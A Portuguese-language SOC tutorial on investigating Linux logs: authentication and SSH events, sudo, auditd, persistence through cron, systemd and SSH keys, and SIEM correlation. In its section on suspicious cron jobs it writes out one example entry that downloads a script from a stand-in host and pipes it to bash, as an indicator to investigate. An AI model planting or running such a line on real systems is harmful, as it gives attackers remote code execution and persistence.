# Linux Logs

## Visão geral

Em ambientes Linux, praticamente tudo que acontece pode deixar algum tipo de registro.

Para um SOC, esses registros são fundamentais para entender:

```text
Autenticações
Acessos SSH
Execução de comandos
Serviços
Processos
Erros
Alterações de configuração
Atividade de usuários
Firewall
Aplicações
```

O objetivo não é simplesmente armazenar logs.

O objetivo é conseguir responder:

```text
Quem acessou?
De onde?
Quando?
O que fez?
Em qual servidor?
O que aconteceu depois?
```

Uma investigação pode começar com um simples:

```text
SSH login
```

e terminar descobrindo:

```text
Login suspeito
      ↓
Comando executado
      ↓
Download de arquivo
      ↓
Execução
      ↓
Persistência
      ↓
Conexão externa
```

---

# Onde ficam os logs no Linux?

Em muitas distribuições Linux, os logs tradicionais ficam em:

```text
/var/log/
```

Para visualizar:

```bash
ls -lah /var/log/
```

Exemplo:

```text
/var/log/
├── auth.log
├── syslog
├── kern.log
├── messages
├── secure
├── boot.log
├── cron
└── journal/
```

Os nomes variam de acordo com a distribuição.

---

# Debian e Ubuntu

Em sistemas baseados em Debian, como Ubuntu, é comum encontrar:

```text
/var/log/auth.log
/var/log/syslog
```

Exemplo:

```bash
sudo tail -f /var/log/auth.log
```

---

# Red Hat, Rocky, AlmaLinux e CentOS

Em sistemas derivados do Red Hat, é comum encontrar:

```text
/var/log/secure
/var/log/messages
```

Exemplo:

```bash
sudo tail -f /var/log/secure
```

Por isso, antes de procurar um arquivo específico, é importante entender qual distribuição está sendo utilizada.

---

# Syslog

O **syslog** é um padrão amplamente utilizado para registro de eventos em sistemas Unix/Linux.

Ele permite que aplicações e serviços enviem mensagens para sistemas de logging.

Um fluxo simplificado:

```text
Aplicação
    ↓
Syslog
    ↓
Arquivo local
    ↓
SIEM
```

Em ambientes corporativos, os eventos também podem ser enviados para um servidor central.

---

# rsyslog

O **rsyslog** é uma das soluções utilizadas para processamento e encaminhamento de logs em Linux.

Pode funcionar como:

```text
Servidor Linux
      ↓
rsyslog
      ↓
Servidor central
      ↓
SIEM
```

Isso permite centralizar registros de diversos servidores.

---

# systemd-journald

Distribuições modernas utilizam frequentemente o **systemd-journald** para gerenciamento de logs.

Os eventos podem ser consultados utilizando:

```bash
journalctl
```

Exemplo:

```bash
journalctl
```

Para acompanhar eventos em tempo real:

```bash
journalctl -f
```

Para visualizar os eventos de um serviço:

```bash
journalctl -u nginx
```

Ou:

```bash
journalctl -u ssh
```

Dependendo da distribuição, o serviço pode ser chamado de:

```text
ssh
sshd
```

---

# Logs de autenticação

Os logs de autenticação são uma das fontes mais importantes para um SOC Linux.

Eles podem registrar:

```text
Login SSH
Falha de autenticação
sudo
Sessões
Alteração de senha
Conta bloqueada
```

Em Ubuntu/Debian:

```text
/var/log/auth.log
```

Em Red Hat:

```text
/var/log/secure
```

---

# SSH

O SSH é uma das principais superfícies de ataque em servidores Linux expostos à Internet.

Um log pode indicar:

```text
Failed password for invalid user admin
```

Isso pode significar uma tentativa de autenticação utilizando uma conta inexistente.

Uma sequência:

```text
Failed
Failed
Failed
Failed
Failed
```

pode indicar:

```text
Brute Force
Password Spray
Scanner
Bot
```

Mas também pode existir uma causa legítima.

---

# Identificando Brute Force

Imagine:

```text
203.0.113.50
        ↓
100 tentativas
        ↓
SSH
        ↓
root
```

O comportamento merece investigação.

Uma pesquisa simples:

```bash
grep "Failed password" /var/log/auth.log
```

Para contar ocorrências:

```bash
grep "Failed password" /var/log/auth.log | wc -l
```

Para procurar um IP específico:

```bash
grep "203.0.113.50" /var/log/auth.log
```

---

# Investigando um usuário específico

Podemos procurar tentativas para `root`:

```bash
grep "Failed password for root" /var/log/auth.log
```

Ou:

```bash
grep "Accepted" /var/log/auth.log
```

Isso permite comparar:

```text
Failed
   ↓
Failed
   ↓
Failed
   ↓
Accepted
```

Essa sequência é particularmente interessante.

---

# Login SSH bem-sucedido

Um evento como:

```text
Accepted password for admin from 203.0.113.50
```

significa que uma autenticação SSH foi aceita.

O analista deve verificar:

```text
Usuário
IP
Horário
Método de autenticação
Servidor
Atividades posteriores
```

Um login válido não significa necessariamente atividade legítima.

Credenciais roubadas podem gerar autenticações perfeitamente válidas.

---

# Chaves SSH

Em servidores Linux, autenticação SSH pode ocorrer utilizando chaves.

Arquivos relacionados podem incluir:

```text
~/.ssh/authorized_keys
```

Uma alteração inesperada nesse arquivo pode ser importante.

Exemplo de cenário:

```text
Login suspeito
      ↓
Acesso ao servidor
      ↓
authorized_keys alterado
      ↓
Persistência
```

Por isso, durante uma investigação, alterações em chaves SSH merecem atenção.

---

# Usuário root

A conta `root` possui privilégios extremamente elevados.

Uma autenticação direta como root pode ser:

```text
Legítima
```

ou:

```text
Altamente suspeita
```

Depende do ambiente.

Em servidores corporativos, normalmente é interessante utilizar contas individuais e `sudo`, permitindo rastrear quem executou determinada ação.

---

# sudo

O `sudo` permite executar comandos com privilégios elevados.

Exemplo:

```bash
sudo systemctl restart nginx
```

Durante uma investigação, é importante saber:

```text
Quem utilizou sudo?
Quando?
Qual comando?
Em qual servidor?
```

Os registros podem estar disponíveis no log de autenticação ou no journal, dependendo da configuração.

---

# Exemplo de investigação com sudo

Imagine:

```text
Usuário:
deploy
```

O log mostra:

```text
sudo: deploy : COMMAND=/bin/bash
```

Isso merece investigação.

Perguntas:

```text
O usuário deveria ter acesso administrativo?
O comando era esperado?
Foi executado durante uma janela de manutenção?
Quem solicitou?
O que aconteceu depois?
```

---

# Execução de comandos

Diferentemente de alguns eventos do Windows, o Linux não registra automaticamente cada comando executado de forma completa em todos os ambientes.

O histórico do shell pode existir em arquivos como:

```text
~/.bash_history
```

Porém:

> **Shell history não deve ser tratado como fonte definitiva de evidência.**

Pode ser:

```text
Desabilitado
Apagado
Alterado
Incompleto
Não persistido
```

Por isso, um SOC deve utilizar outras fontes quando possível.

---

# Auditd

O **auditd** pode fornecer uma camada adicional de auditoria no Linux.

Ele pode registrar eventos relacionados a:

```text
Execução de processos
Acesso a arquivos
Alterações de permissões
Syscalls
Usuários
Configurações
```

Isso fornece mais visibilidade do que depender apenas do histórico do shell.

---

# Exemplo de auditd

Imagine que o SOC queira identificar execução de um comando.

O fluxo pode ser:

```text
Usuário
   ↓
Executa comando
   ↓
auditd registra
   ↓
Evento armazenado
   ↓
SIEM coleta
   ↓
SOC investiga
```

O analista pode consultar os eventos com:

```bash
ausearch
```

Exemplo:

```bash
sudo ausearch -m EXECVE
```

A disponibilidade e o conteúdo dependem das regras configuradas.

---

# Processos

Durante uma investigação, também é importante observar processos ativos.

Comandos úteis:

```bash
ps aux
```

ou:

```bash
ps -ef
```

Para visualizar processos em tempo real:

```bash
top
```

ou:

```bash
htop
```

Esses comandos não são necessariamente fontes de log, mas ajudam na investigação de um servidor comprometido.

---

# Serviços

Serviços Linux podem ser investigados através do systemd.

Exemplo:

```bash
systemctl status nginx
```

Ou:

```bash
systemctl list-units --type=service
```

Para investigar eventos:

```bash
journalctl -u nginx
```

Isso permite relacionar:

```text
Serviço
   ↓
Evento
   ↓
Erro
   ↓
Alteração
```

---

# Persistência

Um atacante que consegue acesso a um servidor pode tentar manter persistência.

Alguns pontos que merecem investigação:

```text
Cron
Systemd
SSH Keys
Startup Scripts
Services
Shell Profiles
Usuários
Sudoers
```

Exemplo:

```text
Acesso inicial
      ↓
Cria chave SSH
      ↓
Configura cron
      ↓
Mantém acesso
```

---

# Cron

O cron pode executar comandos automaticamente.

Verifique:

```bash
crontab -l
```

Para o usuário atual.

Também existem diretórios como:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.weekly/
/etc/cron.monthly/
```

Uma tarefa inesperada pode ser um indicador de persistência.

---

# Exemplo de cron suspeito

Imagine:

```text
*/5 * * * * curl http://example.com/payload.sh | bash
```

Esse tipo de configuração merece investigação imediata.

O analista deve verificar:

```text
Quem criou?
Quando?
Qual arquivo?
Qual destino?
O comando foi executado?
```

---

# Systemd

Atacantes também podem tentar criar serviços para persistência.

Investigue:

```bash
systemctl list-unit-files
```

E:

```bash
systemctl list-units --type=service
```

Procure serviços:

```text
Desconhecidos
Recentemente criados
Com nomes suspeitos
Executando binários fora do padrão
```

---

# Arquivos de configuração importantes

Durante uma investigação, alguns arquivos podem ser especialmente relevantes.

```text
/etc/passwd
/etc/shadow
/etc/group
/etc/sudoers
/etc/ssh/sshd_config
/etc/hosts
/etc/crontab
```

Cada um possui uma finalidade diferente.

---

# /etc/passwd

O arquivo contém informações básicas das contas locais.

Exemplo:

```text
root:x:0:0:root:/root:/bin/bash
```

O analista pode procurar contas desconhecidas.

```bash
cat /etc/passwd
```

Uma conta criada recentemente pode ser legítima ou indicar persistência.

---

# /etc/group

Permite verificar grupos e seus membros.

```bash
cat /etc/group
```

Um ponto importante:

```text
sudo
wheel
adm
docker
```

dependendo da distribuição e configuração.

A inclusão inesperada de um usuário em um grupo privilegiado merece investigação.

---

# /etc/sudoers

Define regras relacionadas ao `sudo`.

Nunca edite diretamente sem entender o impacto.

Para validar configurações, normalmente utiliza-se:

```bash
visudo
```

Durante uma investigação, uma entrada inesperada pode indicar tentativa de elevação de privilégio.

---

# /etc/ssh/sshd_config

Arquivo relacionado à configuração do servidor SSH.

Alguns parâmetros relevantes:

```text
PermitRootLogin
PasswordAuthentication
PubkeyAuthentication
Port
AllowUsers
AllowGroups
```

Exemplo:

```text
PermitRootLogin yes
```

não significa automaticamente vulnerabilidade, mas deve ser avaliado de acordo com a política do ambiente.

---

# Logs de firewall

Linux também pode gerar eventos relacionados ao firewall.

Dependendo da tecnologia:

```text
iptables
nftables
ufw
firewalld
```

Os registros podem mostrar:

```text
IP
Porta
Protocolo
Ação
Interface
Timestamp
```

Exemplo:

```text
SRC=203.0.113.50
DST=192.168.1.10
PROTO=TCP
DPT=22
ACTION=DROP
```

Isso pode ajudar a identificar scanners e tentativas de acesso.

---

# Logs de aplicações

Aplicações Linux também possuem seus próprios logs.

Exemplos:

```text
Nginx
Apache
PHP
Docker
PostgreSQL
MySQL
Redis
SSH
```

Cada aplicação pode registrar:

```text
Acesso
Erro
Autenticação
Requisição
Exceção
Alteração
```

Por isso:

> O `/var/log` é apenas o começo da investigação.

---

# Nginx

Logs comuns:

```text
/var/log/nginx/access.log
/var/log/nginx/error.log
```

O `access.log` pode mostrar:

```text
IP
Data
Método HTTP
URL
Status
User-Agent
```

Exemplo:

```text
203.0.113.50 - - [07/Aug/2026:20:15:10]
"GET /login HTTP/1.1" 200
```

Isso pode ser correlacionado com logs de autenticação.

---

# Apache

Em Apache, arquivos comuns incluem:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
```

ou, dependendo da distribuição:

```text
/var/log/httpd/access_log
/var/log/httpd/error_log
```

---

# Correlação entre logs

Aqui está uma das partes mais importantes para um SOC.

Imagine:

```text
SSH
```

registra:

```text
Accepted login
```

Depois:

```text
sudo
```

registra:

```text
COMMAND=/bin/bash
```

Depois:

```text
auditd
```

registra:

```text
execve
```

E:

```text
Nginx
```

registra:

```text
POST /admin
```

Correlacionando:

```text
SSH Login
   ↓
sudo
   ↓
Execução
   ↓
Acesso Web
```

A investigação começa a formar uma linha do tempo.

---

# Exemplo de incidente realista

Imagine um servidor Linux exposto à Internet.

### 20:00

```text
Failed password
```

### 20:01

```text
Failed password
```

### 20:02

```text
Accepted password
```

### 20:03

```text
sudo
```

### 20:04

```text
authorized_keys alterado
```

### 20:05

```text
cron alterado
```

### 20:06

```text
conexão externa
```

A sequência pode representar:

```text
Brute Force
      ↓
Comprometimento
      ↓
Elevação de privilégio
      ↓
Persistência
      ↓
Command & Control
```

Agora o SOC possui um incidente que precisa ser tratado.

---

# Investigação de SSH

Uma abordagem simples:

### 1. Procurar falhas

```bash
grep "Failed password" /var/log/auth.log
```

### 2. Procurar sucessos

```bash
grep "Accepted" /var/log/auth.log
```

### 3. Procurar um IP

```bash
grep "203.0.113.50" /var/log/auth.log
```

### 4. Procurar uso de sudo

```bash
grep "sudo" /var/log/auth.log
```

### 5. Consultar journal

```bash
journalctl --since "1 hour ago"
```

### 6. Verificar processos

```bash
ps aux
```

### 7. Verificar conexões

```bash
ss -tunap
```

A investigação deve sempre considerar o contexto e o impacto antes de realizar ações destrutivas.

---

# Centralização

Em um ambiente pequeno:

```text
Servidor Linux
   ↓
/var/log
```

Em uma empresa:

```text
Linux 01 ─┐
Linux 02 ─┤
Linux 03 ─┤
Linux 04 ─┤
           ▼
     Centralização
           ▼
          SIEM
           ▼
          SOC
```

Isso permite pesquisar vários servidores ao mesmo tempo.

---

# Linux + Wazuh

Um cenário comum:

```text
Linux Server
      ↓
Wazuh Agent
      ↓
Wazuh Manager
      ↓
Rules
      ↓
Alerts
      ↓
SOC
```

O Wazuh pode monitorar:

```text
Logs
Integridade de arquivos
Rootkits
Vulnerabilidades
Configuração
Processos
```

---

# Linux + Splunk

O Splunk pode coletar logs Linux através de agentes, forwarders ou outras integrações.

Exemplo conceitual:

```spl
index=linux
"Failed password"
```

Para agrupar por IP:

```spl
index=linux "Failed password"
| stats count by src_ip
| sort - count
```

Isso pode ajudar a identificar origens com maior número de tentativas.

---

# Linux + Microsoft Sentinel

Logs Linux podem ser enviados para o Sentinel por mecanismos de coleta e conectores apropriados.

O objetivo:

```text
Linux
 ↓
Syslog
 ↓
Sentinel
 ↓
KQL
 ↓
Detection
 ↓
Incident
```

O analista pode então correlacionar eventos Linux com:

```text
Entra ID
Microsoft Defender
Firewall
Cloud
Windows
```

---

# Threat Hunting em Linux

Threat Hunting não precisa começar com um alerta.

Pode começar com uma hipótese.

Exemplo:

> "Existe algum servidor executando processos incomuns?"

O analista pode investigar:

```bash
ps aux
```

ou procurar eventos relacionados à execução utilizando ferramentas de auditoria.

Outra hipótese:

> "Algum usuário adicionou uma chave SSH recentemente?"

A investigação pode verificar:

```text
~/.ssh/authorized_keys
```

e comparar alterações com os logs disponíveis.

---

# Indicadores importantes

Durante uma investigação Linux, alguns indicadores merecem atenção:

```text
Login SSH inesperado
IP desconhecido
Conta nova
Grupo privilegiado
Nova chave SSH
Cron desconhecido
Serviço desconhecido
Processo incomum
Binário fora do padrão
Conexão externa inesperada
Alteração de configuração
Uso suspeito de sudo
```

Nenhum indicador deve ser analisado completamente isolado.

---

# Logs e MITRE ATT&CK

Os logs Linux podem fornecer evidências relacionadas a diversas técnicas.

Exemplos:

```text
Valid Accounts
T1078
```

```text
Command and Scripting Interpreter
T1059
```

```text
Scheduled Task/Job
T1053
```

```text
SSH
T1021.004
```

```text
Account Manipulation
T1098
```

O mapeamento correto depende dos eventos e do comportamento observado.

---

# Boas práticas

## Centralize os logs

Evite depender apenas dos arquivos locais.

```text
Linux
 ↓
Collector
 ↓
SIEM
```

---

## Sincronize o horário

Utilize NTP.

Sem horário consistente:

```text
Servidor A: 20:01
Servidor B: 19:58
SIEM: 20:04
```

a linha do tempo pode ficar comprometida.

---

## Proteja os logs

Um atacante com privilégios suficientes pode tentar:

```text
Apagar
Alterar
Rotacionar
Desabilitar
```

Por isso, a centralização ajuda a preservar evidências fora do host investigado.

---

## Monitore alterações críticas

Considere monitorar:

```text
/etc/passwd
/etc/group
/etc/sudoers
/etc/ssh/
Cron
Systemd
Arquivos de configuração
```

---

# Checklist

```text
[ ] /var/log monitorado

[ ] Auth logs habilitados

[ ] Syslog configurado

[ ] Journald configurado

[ ] SSH monitorado

[ ] Sudo monitorado

[ ] Auditd avaliado

[ ] Processos monitorados

[ ] Serviços monitorados

[ ] Cron monitorado

[ ] SSH Keys monitoradas

[ ] Contas privilegiadas monitoradas

[ ] Firewall monitorado

[ ] Logs de aplicações coletados

[ ] NTP configurado

[ ] Logs centralizados

[ ] SIEM integrado

[ ] Retenção definida

[ ] Detecções configuradas

[ ] Falsos positivos avaliados

[ ] Procedimentos de investigação documentados
```

---

# Resumo para o SOC

A investigação Linux pode ser resumida em:

```text
Autenticação
     ↓
Privilégio
     ↓
Execução
     ↓
Persistência
     ↓
Comunicação
     ↓
Impacto
```

Um evento:

```text
Accepted password
```

pode parecer normal.

Mas:

```text
Accepted password
       ↓
sudo
       ↓
authorized_keys alterado
       ↓
cron alterado
       ↓
processo desconhecido
       ↓
conexão externa
```

conta uma história completamente diferente.

O trabalho do analista é reconstruir essa história.

---

# Conclusão

Logs Linux são uma das principais fontes de evidência para investigação em ambientes de infraestrutura, servidores, aplicações e cloud.

O conhecimento necessário vai muito além de saber executar:

```bash
cat /var/log/auth.log
```

Um analista precisa entender:

```text
Linux
SSH
Syslog
systemd
Journald
Auditd
Sudo
Processos
Serviços
Cron
Permissões
Networking
SIEM
```

O mais importante é desenvolver a capacidade de conectar os eventos.

```text
Log
 ↓
Contexto
 ↓
Correlação
 ↓
Hipótese
 ↓
Evidência
 ↓
Conclusão
```

> **Um bom analista não procura apenas quem entrou no servidor. Ele procura entender o que aconteceu depois que alguém entrou.**
